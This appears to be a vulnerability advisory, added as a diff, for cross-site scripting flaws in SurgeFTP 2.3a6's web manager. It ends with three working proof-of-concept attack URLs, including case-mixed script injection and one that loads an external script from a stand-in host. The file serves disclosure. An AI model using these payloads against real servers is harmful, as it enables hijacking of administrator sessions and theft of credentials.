@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/37844/info
+
+SurgeFTP is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied data.
+
+Attacker-supplied HTML or JavaScript code could run in an administrator's browser session in the context of the affected site. This could potentially allow the attacker to steal cookie-based authentication credentials; other attacks are also possible.
+
+SurgeFTP 2.3a6 is vulnerable; other versions may also be affected. 
+
+http://www.example.com:7021/cgi/surgeftpmgr.cgi?domainid=>"><ScRiPt%20%0a%0d>alert(213771818860)%3B</ScRiPt>&cmd=user_admin
+http://www.example.com:7021/cgi/surgeftpmgr.cgi?domainid=-1&cmd=class&classid=<img+src=http://127.0.0.1/t.gif+onload=alert(213771818860)>
+http://www.example.com:7021/cgi/surgeftpmgr.cgi?cmd=class&domainid=0&classid=%3CSCRIPT%20SRC=http://www.example.com/xss.js%3E%3C/SCRIPT%3E
